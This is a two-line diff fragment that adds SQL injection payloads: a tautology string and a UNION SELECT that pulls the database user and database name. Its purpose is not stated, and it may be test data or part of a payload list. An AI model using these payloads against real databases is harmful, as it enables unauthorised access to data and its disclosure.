@@ -1,0 +1,2 @@
+Payload: ' OR '1'='1
+Payload: ' UNION SELECT user(), database() #
